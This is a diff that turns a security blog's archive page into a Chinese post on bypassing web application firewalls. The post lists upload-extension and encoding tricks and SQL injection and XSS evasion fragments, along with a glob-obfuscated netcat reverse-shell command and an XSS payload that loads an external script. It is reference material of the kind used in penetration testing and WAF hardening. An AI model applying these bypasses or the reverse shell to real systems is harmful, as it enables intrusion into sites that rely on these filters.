@@ -6,14 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>Archives | 不知名网络安全选手的博客</title>
+  <title>WAF绕过对抗 | 不知名网络安全选手的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="不知名网络安全选手的博客">
-<meta property="og:url" content="https://yd0ng.github.io/archives/page/6/index.html">
+  <meta name="description" content="WAF对抗与绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF绕过对抗">
+<meta property="og:url" content="https://yd0ng.github.io/2020/09/24/WAF%E7%BB%95%E8%BF%87%E5%AF%B9%E6%8A%97/index.html">
 <meta property="og:site_name" content="不知名网络安全选手的博客">
+<meta property="og:description" content="WAF对抗与绕过">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-09-24T06:42:44.000Z">
+<meta property="article:modified_time" content="2020-09-24T10:26:30.907Z">
 <meta property="article:author" content="yd0ng">
+<meta property="article:tag" content="Web安全">
 <meta name="twitter:card" content="summary">
   
   
@@ -130,378 +135,230 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-WAF绕过对抗" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WAF绕过对抗
+    </h1>
+  
+
+        
+        <a href="/2020/09/24/WAF%E7%BB%95%E8%BF%87%E5%AF%B9%E6%8A%97/" class="archive-article-date">
+  	<time datetime="2020-09-24T06:42:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-24</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>WAF对抗与绕过</p>
+<a id="more"></a>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>WAF对抗与绕过，即关注网络架构层、资源层、协议层面、规则缺陷、Web应用层，主要根据WAF部署位置，针对WAF、Web服务器、Web应用对协议解析、字符解析、文件名解析、编码解析以及SQL语法差异来Bypass</p>
+<h1 id="不同架构层的WAF绕过"><a href="#不同架构层的WAF绕过" class="headerlink" title="不同架构层的WAF绕过"></a>不同架构层的WAF绕过</h1><h2 id="网络架构层"><a href="#网络架构层" class="headerlink" title="网络架构层"></a>网络架构层</h2><p>此层主要是涉及到寻找真实IP的方法</p>
+<ul>
+<li>第三方代码托管平台(github、码云)</li>
+<li>网站注释页面、IP标识</li>
+<li>站点探测、img标签加载header、ssrf</li>
+<li>CDN</li>
+<li>运营商(云租户、云设备)租贷</li>
+<li>搜索引擎对于历史镜像的抓取</li>
+<li>漏洞历史曝光(补天、wooyun)</li>
+<li>dnspod、dns历史解析记录</li>
+<li>社工反查域名注册</li>
+<li>利用shadon找网站图标md5、ico、天眼查</li>
+<li>证书certificates</li>
+<li>同一服务器多台域名，有的部署CND、有的没有部署</li>
+</ul>
+<h2 id="资源层"><a href="#资源层" class="headerlink" title="资源层"></a>资源层</h2><ul>
+<li>WAF本身资源、WAF集群资源</li>
+<li>HTTP请求包的大小、填充垃圾思路</li>
+<li>带宽请求、游戏、CDN、WAF、DDos暴露IP</li>
+<li>云WAF、云集群、躲避多个规则检测</li>
+<li>代理模式绕过</li>
+<li>解码功能：多层编码可以绕过单层检测bypass</li>
+<li>IPS模式、数据包切片</li>
+</ul>
+<h2 id="协议层"><a href="#协议层" class="headerlink" title="协议层"></a>协议层</h2><ul>
+<li>协议未覆盖(1.1、1.0、0.9)</li>
+<li>协议解析和Web容器解析不一致</li>
+<li>参数溢出、填充垃圾数据</li>
+<li>参数污染、waf.php?id=1&amp;id=2&amp;id=3</li>
+</ul>
+<h2 id="规则缺陷层"><a href="#规则缺陷层" class="headerlink" title="规则缺陷层"></a>规则缺陷层</h2><ul>
+<li>web应用自身写的过滤函数</li>
+<li>正则绕过(大小写)</li>
+<li>开源waf、规则库</li>
+</ul>
+<h2 id="Web应用层"><a href="#Web应用层" class="headerlink" title="Web应用层"></a>Web应用层</h2><ul>
+<li>数据库</li>
+<li>XSS</li>
+<li>文件上传</li>
+<li>SQL</li>
+<li>XXE等</li>
+</ul>
+<h1 id="WAF绕过技巧"><a href="#WAF绕过技巧" class="headerlink" title="WAF绕过技巧"></a>WAF绕过技巧</h1><h2 id="1-解析后缀"><a href="#1-解析后缀" class="headerlink" title="1. 解析后缀"></a>1. 解析后缀</h2><p>html相关后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html、htm、phtml、pht、Html、Htm、pHtml、cshtml</span><br></pre></td></tr></table></figure>
+<p>asp相关后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp、aspx、asa、asax、ascx、ashx、asmx、cer、aSp、aSpx、aSa、aSax、aScx、aShx、aSmx、cEr</span><br></pre></td></tr></table></figure>
+<p>php相关后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php、php5、php4、php3、php2、pHp、pHp5、pHp4、pHp3、pHp2</span><br></pre></td></tr></table></figure>
+<p>jsp相关后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jsp、jspa、jspx、jsw、jsv、jspf、jtml、jSp、jSpx、jSpa、jSw、jSv、jSpf、jHtml</span><br></pre></td></tr></table></figure>
+<h2 id="2-常见扩展名黑名单"><a href="#2-常见扩展名黑名单" class="headerlink" title="2. 常见扩展名黑名单"></a>2. 常见扩展名黑名单</h2><p>asp相关黑名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asp、asa、cer、cdx、aspx、ashx、ascx、asax</span><br></pre></td></tr></table></figure>
+<p>php相关黑名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php、php2、php3、php4、php5、asis、htaccess</span><br></pre></td></tr></table></figure>
+<p>html或网页黑名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htm、html、shtml、pwml、phtml、js、jsp</span><br></pre></td></tr></table></figure>
+<p>脚本文件黑名单</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vbs、asis、sh、reg、cgi、exe、dll、com、bat、pl、cfc、cfm、ini</span><br></pre></td></tr></table></figure>
+<h2 id="3-空白字符"><a href="#3-空白字符" class="headerlink" title="3. 空白字符"></a>3. 空白字符</h2><p>SQLite3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0A 0D 0C 09 20</span><br></pre></td></tr></table></figure>
+<p>MySQL5</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">09 0A 0B 0C 0D A0 20</span><br></pre></td></tr></table></figure>
+<p>PosgreSQL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0A 0D 0C 09 20</span><br></pre></td></tr></table></figure>
+<p>Oracle</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11g 00 0A 0D 0C 09 20</span><br></pre></td></tr></table></figure>
+<p>MSSQL</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">01-0F、10-1F、20</span><br></pre></td></tr></table></figure>
+<h2 id="4-数据库解析注释符"><a href="#4-数据库解析注释符" class="headerlink" title="4. 数据库解析注释符"></a>4. 数据库解析注释符</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#、&#x2F;*bypasswaf*&#x2F;、-- -- -、--+、&#x2F;&#x2F;、&#x2F;**&#x2F;、;</span><br></pre></td></tr></table></figure>
+<h2 id="5-SQL函数-amp-关键字-MySQL"><a href="#5-SQL函数-amp-关键字-MySQL" class="headerlink" title="5. SQL函数&amp;关键字-MySQL"></a>5. SQL函数&amp;关键字-MySQL</h2><p>关键词函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union、distinct、union districtrow、updatexml、procedure、analyse()、extractvalue()、exp()、ceil()、atan()、sqrt()、floor()、ceiling()、tan()、rand()、sigh()、greatest()</span><br></pre></td></tr></table></figure>
+<p>字符串截取函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid()、substr()、substring()、Lpad()、Rpad()、Left()、Reverse(right(version()),1)</span><br></pre></td></tr></table></figure>
+<p>字符连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char()、hex()、unhex()</span><br></pre></td></tr></table></figure>
+<p>过滤逗号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 0 替代limit 0,1</span><br><span class="line">mid(version() from 1 for 1) 替代 mid(version(),1,1)</span><br></pre></td></tr></table></figure>
+<h2 id="6-SQL函数-amp-关键字-MSSQL数据库"><a href="#6-SQL函数-amp-关键字-MSSQL数据库" class="headerlink" title="6. SQL函数&amp;关键字-MSSQL数据库"></a>6. SQL函数&amp;关键字-MSSQL数据库</h2><p>关键词函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IS_SRVROLEMEMBER()、HAS_DBACCESS()、IS_MEMBER()、convert()、col_name()</span><br></pre></td></tr></table></figure>
+<p>字符串截取函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Substring(@@version,1,1)、left(@@version,1)、</span><br><span class="line">Right(@@version,1)</span><br></pre></td></tr></table></figure>
+<p>字符串转换函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ascii(&#39;a&#39;)、Char(&#39;97&#39;)、Exec</span><br></pre></td></tr></table></figure>
+
+<h2 id="7-容器特性"><a href="#7-容器特性" class="headerlink" title="7. 容器特性"></a>7. 容器特性</h2><p>有些容器会对特殊字符解析，但waf不一定解析，具体需要看容器，如%u0065和%u00f0可以解析为e，可以以此绕过select的过滤</p>
+<p>字母a</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%u0000、%u0041、%u0061、%u00aa、%u00e2</span><br></pre></td></tr></table></figure>
+<p>单引号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%97</span><br></pre></td></tr></table></figure>
+<p>空白</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br></pre></td></tr></table></figure>
+
+<p>左括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br></pre></td></tr></table></figure>
+
+<p>右括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure>
+
+<h2 id="8-IIS-asp-x-容器特性"><a href="#8-IIS-asp-x-容器特性" class="headerlink" title="8. IIS+asp(x)容器特性"></a>8. IIS+asp(x)容器特性</h2><ul>
+<li>%u特性：IIS支持对Unicode的解析，如s%u006c%u0006ect为select、%u0061nd 1=1；多个widechar可能解析为同一字符，如%u0065和%u00f0-&gt;e</li>
+<li>%u特性：IIS+asp会忽略掉百分号</li>
+</ul>
+<h2 id="9-大小写转换法"><a href="#9-大小写转换法" class="headerlink" title="9. 大小写转换法"></a>9. 大小写转换法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL：sEleCt、vERsIon()</span><br><span class="line">XSS：&lt;scrIpt&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="10-字符编码法"><a href="#10-字符编码法" class="headerlink" title="10. 字符编码法"></a>10. 字符编码法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SQL：Unicode、HEX、URL、ASCII、base64</span><br><span class="line">XSS：HTML、URL、ASCII、JS编程、base64</span><br></pre></td></tr></table></figure>
+<h2 id="11-HPP参数污染"><a href="#11-HPP参数污染" class="headerlink" title="11. HPP参数污染"></a>11. HPP参数污染</h2><p>id=1&amp;id=2&amp;id=3，容器给出不同结果：</p>
+<ul>
+<li>asp+IIS：id=1,2,3</li>
+<li>php+apache=3</li>
+</ul>
+<h2 id="12-注入系列-amp-语言-amp-数据库特性"><a href="#12-注入系列-amp-语言-amp-数据库特性" class="headerlink" title="12. 注入系列&amp;语言&amp;数据库特性"></a>12. 注入系列&amp;语言&amp;数据库特性</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|e|&#123;union from&#125;</span><br><span class="line">\nkeyword</span><br><span class="line">&#123;+、-、&#96;&#96;、&#39;&#39;、&quot;&quot;、~、！、！、()、&#123;&#125;&#125;</span><br><span class="line">10个可代替空格的字符</span><br><span class="line">Error Return设计缺陷等</span><br></pre></td></tr></table></figure>
+<h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">30多个可代替空格的字符</span><br><span class="line">Error Return设计缺陷等</span><br></pre></td></tr></table></figure>
+<h3 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--、#、--+、&#x2F;&#x2F;、-- -、&#x2F;**&#x2F;、;%00、&#x2F;!*20000*&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析特性、HPP、畸形Boundary等</span><br></pre></td></tr></table></figure>
+<h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">解析特性等</span><br></pre></td></tr></table></figure>
+<h3 id="OSX"><a href="#OSX" class="headerlink" title="OSX"></a>OSX</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php&#123;\xFC[\x80-\x83]&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host&#39;&#39;name</span><br></pre></td></tr></table></figure>
+<h3 id="windows-amp-amp-IIS"><a href="#windows-amp-amp-IIS" class="headerlink" title="windows&amp;&amp;IIS"></a>windows&amp;&amp;IIS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicode、畸形Unicode、ADS流、N种HTTP畸形正文、解析特性、截断特性、HPP、畸形Boundary、GET&#x2F;POST分不清、畸形字符代替正常字符</span><br></pre></td></tr></table></figure>
+<h3 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Json、Unicode、Base64、URLEncode、HTML、Serialize、URL二次编码</span><br></pre></td></tr></table></figure>
+<h2 id="13-通配符绕过-Linux"><a href="#13-通配符绕过-Linux" class="headerlink" title="13. 通配符绕过(Linux)"></a>13. 通配符绕过(Linux)</h2><p>很多bash语法能够使用问号?、正斜杠/、数字字母来执行命令<br>比如反弹shell时，原本的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 127.0.0.1 1337</span><br></pre></td></tr></table></figure>
+<p>可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;n? -e &#x2F;???&#x2F;b??h hex(127.0.0.1) 1337</span><br></pre></td></tr></table></figure>
+<h2 id="14-数据库绕过-注释符绕过"><a href="#14-数据库绕过-注释符绕过" class="headerlink" title="14. 数据库绕过-注释符绕过"></a>14. 数据库绕过-注释符绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**&#x2F;-&gt;&#x2F;*aaaa%01bbs*&#x2F;-&gt;&#x2F;*aaaa……aaaa*&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="15-数据库绕过-空白符绕过"><a href="#15-数据库绕过-空白符绕过" class="headerlink" title="15. 数据库绕过-空白符绕过"></a>15. 数据库绕过-空白符绕过</h2><ul>
+<li>基于正则的waf以\s匹配空格，与MySQL不同可过waf</li>
+<li>union select，可fuzz两个关键词之间的空格，比如%250C、%25A0<h2 id="16-数据库绕过-浮点数词法解析"><a href="#16-数据库绕过-浮点数词法解析" class="headerlink" title="16. 数据库绕过-浮点数词法解析"></a>16. 数据库绕过-浮点数词法解析</h2></li>
+<li>select * from users where id = 8E0 union select……<h2 id="17-数据库绕过-函数分隔符"><a href="#17-数据库绕过-函数分隔符" class="headerlink" title="17. 数据库绕过-函数分隔符"></a>17. 数据库绕过-函数分隔符</h2>特点：函数名与左括号之间可以存在特殊字符，如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat%2520|&#x2F;**&#x2F;|&#x2F;%250c&#x2F;%25a0()</span><br></pre></td></tr></table></figure>
+<h2 id="18-报错注入深入"><a href="#18-报错注入深入" class="headerlink" title="18. 报错注入深入"></a>18. 报错注入深入</h2></li>
+<li>extractvalue()</li>
+<li>updatexml()</li>
+<li>GeometryCollect()</li>
+<li>polygon()</li>
+<li>linestring()</li>
+<li>multipoint()</li>
+<li>multilinestring()</li>
+<li>multipolygon()<h2 id="19-数据库标识位绕过法"><a href="#19-数据库标识位绕过法" class="headerlink" title="19. 数据库标识位绕过法"></a>19. 数据库标识位绕过法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from uname where uid&#x3D;1[]unionp[]select[]uname,upass[]from[]uname</span><br></pre></td></tr></table></figure>
+<h2 id="20-Fuzz绕过SQL、XSS、上传"><a href="#20-Fuzz绕过SQL、XSS、上传" class="headerlink" title="20. Fuzz绕过SQL、XSS、上传"></a>20. Fuzz绕过SQL、XSS、上传</h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3></li>
+<li>自建fuzz库</li>
+<li>Fuzz</li>
+<li>手动分析确认<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3></li>
+<li>❤️shell.asp过狗、文件名0x90过安全狗、更改filename参数位置</li>
+<li>云锁bypass：0x00过SQL注入如防护</li>
+<li>云锁与安全狗跳过文件大小：可以增大文件</li>
+<li>混合payload过狗</li>
+</ul>
+<h1 id="Tricks"><a href="#Tricks" class="headerlink" title="Tricks"></a>Tricks</h1><ul>
+<li>form-data绕过post参数检测</li>
+<li>添加~</li>
+<li>随机大小写</li>
+<li>单双引号bypass</li>
+<li>添加’’;bypass</li>
+<li>字符破坏bypass</li>
+<li>删除文件bypass</li>
+<li>文件名3%25081.jspx过waf</li>
+<li>XSS bypass<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&gt;&lt;math&gt;a xlink:href&#x3D;&quot;&#x2F;&#x2F;127.0.0.1&#x2F;test.js&quot;&gt;click</span><br></pre></td></tr></table></figure></li>
+</ul>
+
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
     
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/27/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%87%86%E5%A4%87/" class="archive-article-date">
-  	<time datetime="2020-02-27T08:12:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/27/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%87%86%E5%A4%87/">面试问题准备</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
+      <div class="declare" hidden="hidden"></div>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/26/%E5%AE%89%E6%81%922020%E5%B9%B41%E6%9C%88%E6%9C%88%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2020-02-26T13:21:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-26</time>
-</a>
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢您的打赏，大家一起加油喔~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/26/%E5%AE%89%E6%81%922020%E5%B9%B41%E6%9C%88%E6%9C%88%E8%B5%9B/">安恒2020年2月月赛</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/25/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-02-25T07:06:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/25/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B%E5%A4%8D%E7%8E%B0/">GYCTF2020</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" class="archive-article-date">
-  	<time datetime="2020-02-25T01:03:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-25</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">计算机网络基础</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/13/HGAME-2020/" class="archive-article-date">
-  	<time datetime="2020-02-13T06:27:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/13/HGAME-2020/">HGAME 2020</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/11/Python%E7%BC%96%E7%A8%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" class="archive-article-date">
-  	<time datetime="2020-02-11T06:53:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/11/Python%E7%BC%96%E7%A8%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/">Python编程快速入门</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">技术文档</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2020-02-04T06:19:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/">安恒杯新春祈福赛</a>
